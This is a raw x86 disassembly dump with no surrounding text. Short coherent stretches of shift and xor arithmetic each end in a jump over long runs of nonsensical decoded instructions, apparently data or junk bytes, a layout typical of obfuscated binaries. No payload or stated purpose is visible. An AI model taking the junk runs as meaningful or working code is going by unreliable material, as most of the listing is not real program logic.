  406d44:	mov    ecx,DWORD PTR [ebp-0x14]
  406d47:	xor    edx,edx
  406d49:	or     eax,edx
  406d4b:	mov    cl,BYTE PTR [eax+ecx*1]
  406d4e:	mov    eax,DWORD PTR [ebp-0x34]
  406d51:	add    BYTE PTR [eax],cl
  406d53:	mov    eax,DWORD PTR [ebp-0x60]
  406d56:	mov    ecx,DWORD PTR [ebp-0x5c]
  406d59:	shrd   eax,ecx,0x2
  406d5d:	shr    ecx,0x2
  406d60:	mov    ecx,DWORD PTR [ebp-0x60]
  406d63:	mov    edx,DWORD PTR [ebp-0x5c]
  406d66:	xor    eax,edi
  406d68:	xor    edx,edx
  406d6a:	or     eax,edx
  406d6c:	lea    eax,[ebp+eax*1-0x4]
  406d70:	mov    DWORD PTR [ebp-0x34],eax
  406d73:	mov    eax,DWORD PTR [ebp-0x60]
  406d76:	shl    ecx,0x1e
  406d79:	mov    ecx,DWORD PTR [ebp-0x5c]
  406d7c:	shrd   eax,ecx,0x2
  406d80:	shr    ecx,0x2
  406d83:	mov    ecx,DWORD PTR [ebp-0x60]
  406d86:	mov    edx,DWORD PTR [ebp-0x5c]
  406d89:	xor    eax,edi
  406d8b:	xor    edx,edx
  406d8d:	or     eax,edx
  406d8f:	mov    edx,DWORD PTR [ebp+0x14]
  406d92:	shl    ecx,0x1e
  406d95:	mov    ecx,DWORD PTR [ebp-0x14]
  406d98:	mov    cl,BYTE PTR [eax+ecx*1]
  406d9b:	mov    eax,DWORD PTR [ebp-0x34]
  406d9e:	or     BYTE PTR [eax],cl
  406da0:	mov    eax,DWORD PTR [ebp+0x10]
  406da3:	jmp    0x407181
  406da8:	fcmovnb st,st(6)
  406daa:	int3   
  406dab:	xchg   edi,eax
  406dac:	lods   al,BYTE PTR ds:[esi]
  406dad:	jnp    0x406dc9
  406daf:	sbb    cl,BYTE PTR [edi+0x326a0603]
  406db5:	ret    
  406db6:	out    0xaa,eax
  406db8:	or     cl,BYTE PTR [ebx+0x129e1818]
  406dbe:	sbb    BYTE PTR [eax],bl
  406dc0:	pop    ecx
  406dc1:	mov    bh,0x55
  406dc3:	sub    DWORD PTR [eax+0x510e08f7],ebx
  406dc9:	pop    esi
  406dca:	cmp    al,0x40
  406dcc:	pop    es
  406dcd:	(bad)  
  406dcf:	int    0xaa
  406dd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406dd2:	fisttp WORD PTR [ebp+0x12]
  406dd5:	sbb    DWORD PTR [eax+0x460dd7ee],esi
  406ddb:	out    0x6f,al
  406ddd:	xchg   edx,eax
  406dde:	loope  0x406da9
  406de0:	mov    ch,0xd4
  406de2:	push   ds
  406de3:	scas   al,BYTE PTR es:[edi]
  406de4:	jmp    0x406e62
  406de6:	pop    ds
  406de7:	xor    eax,0x90db3d1b
  406dec:	dec    eax
  406ded:	push   ebp
  406dee:	jl     0x406e5e
  406df0:	loopne 0x406db8
  406df2:	push   ecx
  406df3:	dec    edx
  406df4:	inc    DWORD PTR [edi+0x6b7c4d5d]
  406dfa:	xor    ebx,DWORD PTR [edx+esi*8]
  406dfd:	in     al,0x53
  406dff:	pop    esi
  406e00:	rol    BYTE PTR [eax+0x2e484117],1
  406e06:	sbb    BYTE PTR [edx+0x43],bh
  406e09:	daa    
  406e0a:	mov    al,0x80
  406e0c:	sbb    cl,BYTE PTR [ebp+eiz*1+0x65794f94]
  406e13:	es jmp 0x40533358
  406e19:	and    eax,0x23887b44
  406e1e:	jbe    0x406e35
  406e20:	jle    0x406e47
  406e22:	adc    DWORD PTR ds:0x1b058609,esp
  406e28:	aad    0x70
  406e2a:	ss loop 0x406dba
  406e2d:	pmaxsw mm7,QWORD PTR [edx+0xb1e41e9]
  406e34:	pop    ss
  406e35:	stos   DWORD PTR es:[edi],eax
  406e36:	je     0x406dce
  406e38:	fisttp WORD PTR [ebp-0x73f4da2a]
  406e3e:	or     al,0x89
  406e40:	or     BYTE PTR [ecx],ah
  406e42:	or     al,0x22
  406e44:	mov    ah,0xed
  406e46:	mov    bh,0xc5
  406e48:	cmp    ebp,eax
  406e4a:	xor    DWORD PTR [ecx+0x6d],edi
  406e4d:	sti    
  406e4e:	rcl    bh,cl
  406e50:	mov    al,0xad
  406e52:	ins    BYTE PTR es:[edi],dx
  406e53:	leave  
  406e54:	inc    esp
  406e55:	mov    dh,0x70
  406e57:	jp     0x406df5
  406e59:	sbb    al,0x7b
  406e5b:	and    eax,0x92e9e667
  406e60:	mov    ds:0x8a93a82,al
  406e65:	lods   al,BYTE PTR ds:[esi]
  406e66:	bound  ebx,QWORD PTR [edi-0x45]
  406e69:	pusha  
  406e6a:	push   cs
  406e6b:	into   
  406e6c:	and    bh,BYTE PTR [eax-0x69]
  406e6f:	sbb    ebx,DWORD PTR ds:0x7857a794
  406e75:	div    bh
  406e77:	or     bh,ah
  406e79:	and    eax,0xf707a85d
  406e7e:	test   BYTE PTR [ecx],ah
  406e80:	jno    0x406e77
  406e82:	xchg   esp,eax
  406e83:	jnp    0x406e8b
  406e85:	mov    cl,0x83
  406e87:	mov    BYTE PTR [ecx+0x2eb271ef],dh
  406e8d:	ja     0x406e42
  406e8f:	in     al,dx
  406e90:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e92:	add    al,0xaa
  406e94:	enter  0x8176,0x58
  406e98:	pop    eax
  406e99:	push   ss
  406e9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e9b:	inc    edi
  406e9c:	mov    ah,BYTE PTR [esp+eax*1+0x78a2dcdc]
  406ea3:	sub    BYTE PTR [esi],0x33
  406ea6:	or     esp,ecx
  406ea8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ea9:	jle    0x406e71
  406eab:	lock pop ecx
  406ead:	dec    ebp
  406eae:	adc    al,0xfc
  406eb0:	jge    0x406e56
  406eb2:	std    
  406eb3:	or     edx,DWORD PTR es:[esi+0x3c]
  406eb7:	push   ecx
  406eb8:	neg    DWORD PTR [ebx-0x44]
  406ebb:	fs push ds
  406ebd:	out    0xba,eax
  406ebf:	outs   dx,DWORD PTR ds:[esi]
  406ec0:	push   edx
  406ec1:	or     eax,0x87eb4a48
  406ec6:	test   DWORD PTR [edi],ebp
  406ec8:	cmp    BYTE PTR [edx-0x5],cl
  406ecb:	cmp    DWORD PTR [edx-0x388159b6],edx
  406ed1:	nop
  406ed2:	mov    edi,DWORD PTR [ebx]
  406ed4:	test   BYTE PTR [ebp-0x3e4c6de3],bl
  406eda:	mov    bl,ah
  406edc:	cs cli 
  406ede:	sub    ebx,DWORD PTR ds:0xfa4950d
  406ee4:	shr    ebx,1
  406ee6:	pop    ss
  406ee7:	pop    ecx
  406ee8:	adc    bl,dh
  406eea:	ins    BYTE PTR es:[edi],dx
  406eeb:	xor    BYTE PTR [edx-0x4a39343d],dh
  406ef1:	adc    esp,esi
  406ef3:	cwde   
  406ef4:	cmc    
  406ef5:	mov    al,ds:0xe1108ccd
  406efa:	and    dl,cl
  406efc:	es jl  0x406f7c
  406eff:	lahf   
  406f00:	jae    0x406eb2
  406f02:	jae    0x406f6a
  406f04:	mov    ds:0xeebbf3a2,eax
  406f09:	clc    
  406f0a:	fdiv   QWORD PTR [eax]
  406f0c:	out    0x8,eax
  406f0e:	adc    al,0x3e
  406f10:	and    eax,DWORD PTR [ebx]
  406f12:	and    eax,DWORD PTR [ecx+ebx*4-0x2]
  406f16:	sahf   
  406f17:	inc    ebx
  406f18:	(bad)  
  406f1a:	repz test al,0x71
  406f1d:	clc    
  406f1e:	adc    eax,0x80d2f48b
  406f23:	shl    eax,cl
  406f25:	mov    eax,0x1ac7b62c
  406f2a:	sbb    ebp,DWORD PTR [eax-0x70]
  406f2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f2e:	sbb    BYTE PTR [ecx],dh
  406f30:	or     dh,BYTE PTR [edx]
  406f32:	inc    esp
  406f33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f34:	sbb    BYTE PTR [esp+edx*2],bl
  406f37:	popa   
  406f38:	jge    0x406f05
  406f3a:	addr16 lahf 
  406f3c:	icebp  
  406f3d:	xchg   ebp,eax
  406f3e:	jp     0x406ec1
  406f40:	mov    ds:0xd0d32829,eax
  406f45:	xchg   edi,eax
  406f46:	lods   al,BYTE PTR ds:[esi]
  406f47:	fs inc esp
  406f49:	add    eax,0xa84b7d1d
  406f4e:	push   esp
  406f4f:	mov    bh,0x6c
  406f51:	inc    eax
  406f52:	dec    esi
  406f53:	repnz add DWORD PTR [edi-0x60],esi
  406f57:	retf   0x46e3
  406f5a:	cmp    bh,BYTE PTR [esi-0x16]
  406f5d:	popf   
  406f5e:	adc    al,bl
  406f60:	mov    ah,0x81
  406f62:	mov    ds:0xa45d05e4,eax
  406f67:	push   ss
  406f68:	call   0x2ec35c64
  406f6d:	jb     0x406f1d
  406f6f:	stos   BYTE PTR es:[edi],al
  406f70:	pop    edx
  406f71:	inc    eax
  406f72:	fadd   st,st(0)
  406f74:	scas   eax,DWORD PTR es:[edi]
  406f75:	loopne 0x406f56
  406f77:	loopne 0x406f63
  406f79:	push   esi
  406f7a:	stos   BYTE PTR es:[edi],al
  406f7b:	ss call 0x1a92:0xb707b8d3
  406f83:	fwait
  406f84:	push   es
  406f85:	fst    DWORD PTR [ebx]
  406f87:	push   ss
  406f88:	jo     0x407000
  406f8a:	pop    edi
  406f8b:	push   cs
  406f8c:	jecxz  0x406f68
  406f8e:	scas   al,BYTE PTR es:[edi]
  406f8f:	lds    edi,FWORD PTR [ebp+0x60]
  406f92:	push   cs
  406f93:	push   edi
  406f94:	dec    ebx
  406f95:	xchg   ebx,eax
  406f96:	repnz push cs
  406f98:	cdq    
  406f99:	fcmovbe st,st(5)
  406f9b:	dec    esi
  406f9c:	xchg   ebp,eax
  406f9d:	mov    esi,0xee9c257a
  406fa2:	adc    eax,0xa16fdfa9
  406fa7:	add    cl,dl
  406fa9:	cmp    DWORD PTR [ebx*1+0x5681ec8d],eax
  406fb0:	and    edi,DWORD PTR [ecx-0x52cba9b]
  406fb6:	sub    eax,0xa9e21a9c
  406fbb:	or     al,0x63
  406fbd:	sbb    al,0xc3
  406fbf:	lods   eax,DWORD PTR ds:[esi]
  406fc0:	fistp  DWORD PTR [ebp+0x67d9302e]
  406fc6:	fsub   st(4),st
  406fc8:	adc    edx,edx
  406fca:	mov    esp,0x46f56396
  406fcf:	pop    esp
  406fd0:	int    0xc2
  406fd2:	or     ah,BYTE PTR [ebx]
  406fd4:	into   
  406fd5:	fistp  QWORD PTR [edx+0x767dec5f]
  406fdb:	and    cl,BYTE PTR [eax+0x38]
  406fde:	mov    ah,0xc5
  406fe0:	shl    BYTE PTR [eax-0x59745736],0x19
  406fe7:	fnstenv [eax]
  406fe9:	call   0x1216:0x2e9a22f7
  406ff0:	dec    eax
  406ff1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ff2:	pop    edi
  406ff3:	loopne 0x406f7b
  406ff5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ff6:	rcr    DWORD PTR [edi-0x5],1
  406ff9:	push   ecx
  406ffa:	aas    
  406ffb:	push   esi
  406ffc:	cmp    edi,ebp
  406ffe:	push   edi
  406fff:	or     eax,0xcd09a143
  407004:	sbb    bl,dl
  407006:	xor    cl,0x11
  407009:	retf   
  40700a:	js     0x407025
  40700c:	xchg   ebx,eax
  40700d:	cmp    esi,0xffffff9f
  407010:	fld    DWORD PTR [eax-0x5]
  407013:	stc    
  407014:	push   ebx
  407015:	sub    eax,0x57565030
  40701a:	sub    al,0x3d
  40701c:	je     0x406fa3
  40701e:	and    ebx,ebx
  407020:	jns    0x40706e
  407022:	mov    BYTE PTR [edx+0x20],ch
  407025:	test   al,0x38
  407027:	aad    0xba
  407029:	ret    0x8e43
  40702c:	(bad)  
  40702d:	jnp    0x406fb5
  40702f:	push   cs
  407030:	call   0x94aed7e7
  407035:	inc    eax
  407036:	jmp    0x407007
  407038:	dec    ebp
  407039:	sbb    al,0x3d
  40703b:	out    0x1d,al
  40703d:	ret    
  40703e:	xor    ch,BYTE PTR [ecx-0x1da4d1c9]
  407044:	add    DWORD PTR [ebp+0x3eeb6855],edi
  40704a:	in     eax,dx
  40704b:	push   ebp
  40704c:	xor    ch,BYTE PTR [ebp+0x78]
  40704f:	retf   0xfe5f
  407052:	inc    esi
  407053:	jmp    0x4070a6
  407055:	jecxz  0x407039
  407057:	jns    0x406fdc
  407059:	cli    
  40705a:	mov    eax,0x1c2139bf
  40705f:	mov    ebp,DWORD PTR [ebp-0x229aac3f]
  407065:	test   al,0x89
  407067:	jno    0x407010
  407069:	scas   al,BYTE PTR es:[edi]
  40706a:	pop    esp
  40706b:	clc    
  40706c:	push   ebx
  40706d:	sbb    DWORD PTR [ebp-0x1e],0x75308640
  407074:	mov    dl,0x15
  407076:	(bad)
  407079:	js     0x40705f
  40707b:	sbb    DWORD PTR [eax+0x318dbd77],edx
  407081:	mov    edx,0xdcd3de06
  407086:	loop   0x407037
  407088:	push   cs
  407089:	mov    eax,0x6b6e5793
  40708e:	(bad)
  407091:	bound  ecx,QWORD PTR [eax+0x69746183]
  407097:	mov    dh,0x70
  407099:	or     dl,dh
  40709b:	test   eax,0x665d4fa8
  4070a0:	shr    esi,1
  4070a2:	pop    ecx
  4070a3:	mov    ch,0x6d
  4070a5:	lods   eax,DWORD PTR ds:[esi]
  4070a6:	cs sbb eax,0xc71180b1
  4070ac:	cmp    al,0x6c
  4070ae:	add    eax,0x3430d8a5
  4070b3:	sub    BYTE PTR [eax],ah
  4070b5:	dec    eax
  4070b6:	sub    eax,0x6ad396ce
  4070bb:	jae    0x40704b
  4070bd:	ret    0x5101
  4070c0:	or     eax,0x6df0d588
  4070c5:	xchg   DWORD PTR [bp+di-0x5],ebp
  4070c9:	aaa    
  4070ca:	xchg   ebx,eax
  4070cb:	nop
  4070cc:	sub    eax,DWORD PTR [ebp+0x13]
  4070cf:	adc    eax,0xca1c4e5b
  4070d4:	icebp  
  4070d5:	sub    dl,ch
  4070d7:	cmp    ebx,0x7a
  4070da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070db:	mov    eax,ds:0x8a5321f8
  4070e0:	cdq    
  4070e1:	sahf   
  4070e2:	pop    ebp
  4070e3:	out    dx,al
  4070e4:	aas    
  4070e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070e6:	mov    ch,0xb7
  4070e8:	xor    DWORD PTR [edi-0x3305737a],esp
  4070ee:	dec    esi
  4070ef:	dec    edi
  4070f0:	pop    esp
  4070f1:	xor    bl,BYTE PTR [ecx+eax*8-0x44843323]
  4070f8:	test   al,0xa4
  4070fa:	dec    ecx
  4070fb:	sahf   
  4070fc:	clc    
  4070fd:	inc    edx
  4070fe:	stc    
  4070ff:	aam    0x1d
  407101:	and    BYTE PTR [esi],dh
  407103:	jle    0x40711c
  407105:	mov    bl,0x41
  407107:	mov    esi,edi
  407109:	call   0xea4d8656
  40710e:	jns    0x4070b0
  407110:	dec    esi
  407111:	inc    ebx
  407112:	outs   dx,DWORD PTR ds:[esi]
  407113:	mov    esi,0xe2e48718
  407118:	in     al,0x1d
  40711a:	jmp    0xcbd6cee8
  40711f:	aaa    
  407120:	iret   
  407121:	push   edx
  407122:	push   edi
  407123:	jecxz  0x4070bb
  407125:	add    dh,BYTE PTR [ebx]
  407127:	fcom   DWORD PTR [ebx-0x3d0fa348]
  40712d:	xor    al,al
  40712f:	and    BYTE PTR [ebx-0x7a2cddd6],cl
  407135:	mov    dl,0xa1
  407137:	cmp    ebp,DWORD PTR [eax-0x4f884be8]
  40713d:	adc    al,cl
  40713f:	into   
  407140:	sub    dh,BYTE PTR [edx+0x5b6c580a]
  407146:	(bad)  
  407147:	dec    edi
  407148:	sbb    ch,BYTE PTR [ecx+0x21d1d2f1]
  40714e:	ret    
  40714f:	es (bad) 
  407151:	repz mov ah,0x80
  407154:	retf   
  407155:	imul   edx,DWORD PTR [edi],0x78
  407158:	pop    esp
  407159:	and    ah,BYTE PTR [esi-0x1b]
  40715c:	lods   al,BYTE PTR ds:[esi]
  40715d:	(bad)  
  40715e:	sub    eax,0xd2cc76
  407163:	jns    0x4071a9
  407165:	test   BYTE PTR [ecx+0x70],0x55
  407169:	sbb    al,BYTE PTR [esi+0x4996fddb]
  40716f:	imul   ebx
  407171:	mov    ecx,0x327856c1
  407176:	ss arpl dx,ax
  407179:	or     eax,0x68a2e42f
  40717e:	push   ds
  40717f:	scas   eax,DWORD PTR es:[edi]
  407180:	cwde   
  407181:	mov    ecx,eax
  407183:	shrd   ecx,edx,0x2
  407187:	shl    eax,0x1e
  40718a:	shr    edx,0x2
  40718d:	mov    DWORD PTR [ebp+0x14],edx
  407190:	mov    DWORD PTR [ebp+0x14],eax
  407193:	xor    edx,edx
  407195:	mov    eax,ecx
  407197:	xor    eax,edi
  407199:	or     eax,edx
  40719b:	mov    edx,DWORD PTR [ebp-0x4]
  40719e:	dec    eax
  40719f:	not    eax
  4071a1:	and    eax,edx
  4071a3:	xor    ecx,edi
  4071a5:	mov    DWORD PTR [ebp-0x4],eax
  4071a8:	mov    DWORD PTR [ebp+0x14],ecx
  4071ab:	xor    eax,eax
  4071ad:	or     DWORD PTR [ebp+0x14],eax
  4071b0:	mov    eax,DWORD PTR [ebp-0x50]
  4071b3:	jmp    0x407591
  4071b8:	fiadd  DWORD PTR [ecx-0x1d]
  4071bb:	mov    ah,BYTE PTR [edx]
  4071bd:	sub    bl,BYTE PTR [edx+0x21]
  4071c0:	jnp    0x407190
  4071c2:	mov    ch,0x7c
  4071c4:	(bad)  
  4071c5:	jl     0x407210
  4071c7:	push   0xffffff90
  4071c9:	test   DWORD PTR [eax],ebx
  4071cb:	sbb    BYTE PTR [esi-0x19e7e7ee],bl
  4071d1:	ror    dh,1
  4071d3:	es shl edx,1
  4071d6:	inc    esp
  4071d7:	stc    
  4071d8:	jae    0x4071b7
  4071da:	mov    al,0x6c
  4071dc:	mov    eax,0x997f6908
  4071e1:	pop    esi
  4071e2:	sti    
  4071e3:	and    al,0xf1
  4071e5:	sbb    DWORD PTR [esi+0x63],eax
  4071e8:	push   ebp
  4071e9:	inc    edi
  4071ea:	(bad)
  4071ef:	lds    ecx,FWORD PTR [ebx]
  4071f1:	pop    edx
  4071f2:	dec    ebx
  4071f3:	fwait
  4071f4:	add    BYTE PTR [esi+0x73c644de],al
  4071fa:	jnp    0x407216
  4071fc:	jo     0xc972a972
  407202:	sbb    edx,ecx
  407204:	ins    DWORD PTR es:[edi],dx
  407205:	lahf   
  407206:	mov    dh,0xe1
  407208:	outs   dx,BYTE PTR ds:[esi]
  407209:	rol    DWORD PTR [ecx+0x3c],1
  40720c:	inc    ebp
  40720d:	mov    eax,ds:0xd8a2b378
  407212:	xor    eax,DWORD PTR [edx+0x7e]
  407215:	xchg   edx,eax
  407216:	fisubr DWORD PTR [edx-0x3bfae72b]
  40721c:	rcr    ah,0x34
  40721f:	(bad)
  407222:	(bad)  
  407224:	sar    BYTE PTR es:[edi],0x55
  407228:	lock sbb BYTE PTR [eax-0x3],ah
  40722c:	repnz sub BYTE PTR [bx-0x72],al
  407231:	or     bh,BYTE PTR [esi+ecx*1]
  407234:	std    
  407235:	test   DWORD PTR [edi+eiz*2],eax
  407238:	push   edx
  407239:	or     BYTE PTR [ebx+edi*4+0x6e],dl
  40723d:	dec    ebp
  40723e:	rol    edi,0x2a
  407241:	push   ss
  407242:	clc    
  407243:	mov    ebp,0x1035c17f
  407248:	add    bh,BYTE PTR [ebx]
  40724a:	mov    edi,0x1be85cec
  40724f:	xor    bh,cl
  407251:	in     eax,dx
  407252:	sub    esp,edx
  407254:	lods   eax,DWORD PTR ds:[esi]
  407255:	xchg   ecx,eax
  407256:	les    sp,DWORD PTR [esi]
  407259:	icebp  
  40725a:	jae    0x40724c
  40725c:	jo     0x407288
  40725e:	(bad)  [eax]
  407260:	scas   al,BYTE PTR es:[edi]
  407261:	jmp    edx
  407263:	mov    WORD PTR [eax],ds
  407265:	in     eax,dx
  407266:	jle    0x407201
  407268:	inc    eax
  407269:	sbb    DWORD PTR [ebp-0x19503aa2],ebx
  40726f:	cwde   
  407270:	cmp    al,0x54
  407272:	scas   eax,DWORD PTR es:[edi]
  407273:	fsubrp st(4),st
  407275:	out    0x5f,eax
  407277:	addr16 imul ecx,eax,0x7f
  40727b:	cmp    eax,DWORD PTR ds:0x2049ccd
  407281:	jbe    0x4072df
  407283:	cmp    BYTE PTR [edi+0x1b4dcf2a],0xfb
  40728a:	xchg   edi,eax
  40728b:	push   ecx
  40728c:	les    edi,FWORD PTR [esp+ecx*1-0x65e061c0]
  407293:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407294:	stos   DWORD PTR es:[edi],eax
  407295:	popf   
  407296:	dec    eax
  407297:	xacquire xchg DWORD PTR [eax],eax
  40729a:	(bad)
  40729d:	xchg   esp,eax
  40729e:	das    
  40729f:	jno    0x484ccee5
  4072a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072a6:	cdq    
  4072a7:	mov    ah,0x58
  4072a9:	push   ecx
  4072aa:	jbe    0x4072e1
  4072ac:	retf   
  4072ad:	inc    ebx
  4072ae:	mov    edi,0x5474d4f7
  4072b3:	out    dx,eax
  4072b4:	(bad)  [edi]
  4072b6:	mov    esp,0xe2776e66
  4072bb:	inc    eax
  4072bc:	sub    ch,bl
  4072be:	shl    BYTE PTR [eax],1
  4072c0:	sub    BYTE PTR [ecx-0x39277bfe],dl
  4072c6:	pop    edi
  4072c7:	cmp    eax,0xcb44a65f
  4072cc:	outs   dx,DWORD PTR ds:[esi]
  4072cd:	pusha  
  4072ce:	out    dx,eax
  4072cf:	out    dx,eax
  4072d0:	push   ecx
  4072d1:	push   ecx
  4072d2:	pop    ds
  4072d3:	hlt    
  4072d4:	aas    
  4072d5:	fnstcw WORD PTR [eax+eiz*1-0x53897c47]
  4072dc:	sub    eax,0x8f3a9859
  4072e1:	cli    
  4072e2:	int3   
  4072e3:	and    BYTE PTR [edx+edx*8],al
  4072e6:	pop    es
  4072e7:	sub    ebx,eax
  4072e9:	push   0xb6c7920f
  4072ee:	ss inc eax
  4072f0:	ja     0x407344
  4072f2:	pop    ds
  4072f3:	mov    dh,0x99
  4072f5:	jae    0x407316
  4072f7:	stos   BYTE PTR es:[edi],al
  4072f8:	xchg   ebp,eax
  4072f9:	jae    0x4072dc
  4072fb:	mov    ebp,0xe1227493
  407300:	ins    DWORD PTR es:[edi],dx
  407301:	ficom  DWORD PTR [ebx]
  407303:	mov    cl,0xbe
  407305:	out    dx,eax
  407306:	mov    ebx,0xde5124b7
  40730b:	aam    0xdf
  40730d:	pop    edx
  40730e:	pop    es
  40730f:	iret   
  407310:	jne    0x8ef4
  407315:	into   
  407316:	add    ah,BYTE PTR [ebx+0x43cdda40]
  40731c:	sub    eax,0x2f9f662f
  407321:	and    BYTE PTR [ebp+0x168efb0e],bl
  407327:	fimul  WORD PTR [edx+0x38]
  40732a:	in     eax,0xfe
  40732c:	sbb    ebp,DWORD PTR [ebp-0x696620aa]
  407332:	pop    ecx
  407333:	ins    BYTE PTR es:[edi],dx
  407334:	ret    
  407335:	and    ch,cl
  407337:	cmp    BYTE PTR ds:0x2f743e70,bl
  40733d:	inc    ebp
  40733e:	les    ecx,FWORD PTR ds:0x713f5e49
  407344:	jle    0x40739b
  407346:	ins    BYTE PTR es:[edi],dx
  407347:	and    eax,0xe6f638f6
  40734c:	inc    ebx
  40734d:	mov    ds:0xf26f49c4,eax
  407352:	and    al,0x82
  407354:	and    al,0xba
  407356:	loopne 0x40734e
  407358:	loopne 0x407389
  40735a:	push   esi
  40735b:	push   esp
  40735c:	fstp   QWORD PTR [edi+0x21]
  40735f:	pushf  
  407360:	cld    
  407361:	mov    dl,0xd3
  407363:	mov    ebx,0x5311baff
  407368:	mov    ds:0x68ea6fd6,eax
  40736d:	in     eax,0xe3
  40736f:	aaa    
  407370:	mov    esp,0x8b0114dd
  407375:	mov    bl,0xc1
  407377:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407378:	jne    0x407302
  40737a:	sbb    bh,BYTE PTR [ecx-0x7b]
  40737d:	inc    ebx
  40737e:	jp     0x407360
  407380:	in     eax,0xd8
  407382:	and    ecx,0x6022f683
  407388:	daa    
  407389:	sbb    DWORD PTR [eax],0x7d13e9b7
  40738f:	scas   al,BYTE PTR es:[edi]
  407390:	jb     0x40733e
  407392:	sbb    ebx,DWORD PTR [ebx-0x37]
  407395:	pop    ebx
  407396:	dec    edi
  407397:	test   BYTE PTR [eax+edi*8],cl
  40739a:	mov    es,ebx
  40739c:	cmc    
  40739d:	popa   
  40739e:	aam    0x63
  4073a0:	or     BYTE PTR ds:0x7034ae6b,bl
  4073a6:	add    cl,BYTE PTR [ecx]
  4073a8:	loop   0x407372
  4073aa:	dec    ebp
  4073ab:	out    0x47,al
  4073ad:	hlt    
  4073ae:	mov    esi,0xeb63c4c0
  4073b3:	inc    edi
  4073b4:	dec    edi
  4073b5:	std    
  4073b6:	fist   DWORD PTR [edx]
  4073b8:	pop    ss
  4073b9:	mov    edx,0x63b180c4
  4073be:	pop    edx
  4073bf:	sbb    al,0x22
  4073c1:	mov    bh,0xb9
  4073c3:	iret   
  4073c4:	push   cs
  4073c5:	aam    0xc6
  4073c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073c8:	and    al,0xf3
  4073ca:	cdq    
  4073cb:	xor    eax,0x5b68c385
  4073d0:	loop   0x407427
  4073d2:	ffreep st(0)
  4073d4:	add    cl,cl
  4073d6:	fwait
  4073d7:	adc    al,0x33
  4073d9:	dec    ebx
  4073da:	mov    WORD PTR [edi-0x8d2a2c9],ss
  4073e0:	aaa    
  4073e1:	es int3 
  4073e3:	or     al,0xe5
  4073e5:	cmp    bh,bh
  4073e7:	repz cmp eax,0x7a02a1ca
  4073ed:	mov    dl,0x60
  4073ef:	test   DWORD PTR [ecx],ebp
  4073f1:	mov    esp,0xfa60c1d5
  4073f6:	sahf   
  4073f7:	mov    ebx,0xb273fd90
  4073fc:	bound  esi,QWORD PTR [ebx+0x5c821174]
  407402:	jae    0x407458
  407404:	or     al,0x8e
  407406:	mov    eax,ds:0x361bc44a
  40740b:	jl     0x407451
  40740d:	jbe    0x407459
  40740f:	bnd jns 0x8091d3b2
  407416:	fdivr  st(3),st
  407418:	(bad)  
  407419:	call   0x876a87e5
  40741e:	xor    eax,0x45688723
  407423:	xor    eax,0x6af7a8ef
  407428:	call   0xf5080ce1
  40742d:	sub    DWORD PTR [ecx-0x5e91dd9e],0xfffffff2
  407434:	int    0x4b
  407436:	int    0x89
  407438:	ficomp WORD PTR [ecx+0x7c]
  40743b:	js     0x407495
  40743d:	jmp    0x407417
  40743f:	(bad)  
  407440:	ins    DWORD PTR es:[edi],dx
  407441:	pop    edi
  407442:	inc    edi
  407443:	cmp    al,0x74
  407445:	xchg   esp,eax
  407446:	jmp    0xe0c9:0x7027aa86
  40744d:	sbb    eax,DWORD PTR [ebx]
  40744f:	jns    0x407404
  407451:	inc    edx
  407452:	pop    ss
  407453:	(bad)  
  407454:	sub    eax,0x9bad60bf
  407459:	(bad)  
  40745a:	xchg   esi,eax
  40745b:	je     0x4073f2
  40745d:	cmp    esp,esi
  40745f:	repnz data16 daa 
  407462:	nop
  407463:	iret   
  407464:	xchg   esp,eax
  407465:	jmp    0x40747d
  407467:	rol    DWORD PTR [eiz*2+0x58ed0d70],cl
  40746e:	shl    DWORD PTR [edx-0x231862f3],0xa1
  407475:	rcl    ebx,0x30
  407478:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407479:	cmp    bl,dl
  40747b:	ja     0x407457
  40747d:	shl    cl,cl
  40747f:	cs push ecx
  407481:	pop    eax
  407482:	js     0x4074ea
  407484:	add    al,0x60
  407486:	stos   BYTE PTR es:[edi],al
  407487:	mov    ch,0xe5
  407489:	inc    esp
  40748a:	stos   BYTE PTR es:[edi],al
  40748b:	mov    WORD PTR [eax-0x67],ss
  40748e:	das    
  40748f:	inc    esp
  407490:	inc    edx
  407491:	adc    dl,BYTE PTR ds:0x70fd0cf3
  407497:	lahf   
  407498:	xor    al,0xb4
  40749a:	mov    esi,0x8d709779
  40749f:	int3   
  4074a0:	jecxz  0x407456
  4074a2:	scas   al,BYTE PTR es:[edi]
  4074a3:	or     al,0x8a
  4074a5:	cmp    eax,0xd5a77902
  4074aa:	out    0xf3,eax
  4074ac:	sbb    DWORD PTR [ebp+0x5cfe35bc],ebp
  4074b2:	addr16 (bad) 
  4074b4:	xchg   ebp,eax
  4074b5:	adc    al,0xea
  4074b7:	sti    
  4074b8:	pop    esp
  4074b9:	popa   
  4074ba:	cdq    
  4074bb:	mov    bl,0x6d
  4074bd:	xchg   ebp,eax
  4074be:	pushf  
  4074bf:	or     DWORD PTR [ecx+0x6fe97f79],eax
  4074c5:	in     eax,dx
  4074c6:	std    
  4074c7:	fst    QWORD PTR [edi]
  4074c9:	pop    ecx
  4074ca:	dec    DWORD PTR [eax]
  4074cc:	mov    DWORD PTR [esi+0x5fb464c],esp
  4074d2:	push   esp
  4074d3:	in     al,dx
  4074d4:	aas    
  4074d5:	mov    edx,esi
  4074d7:	aas    
  4074d8:	jo     0x407521
  4074da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074db:	and    dl,0xd7
  4074de:	enter  0x206,0x76
  4074e2:	mov    ebx,0xacea2280
  4074e7:	(bad)  
  4074e8:	aaa    
  4074e9:	jno    0x4074c9
  4074eb:	cmp    al,0x96
  4074ed:	inc    ecx
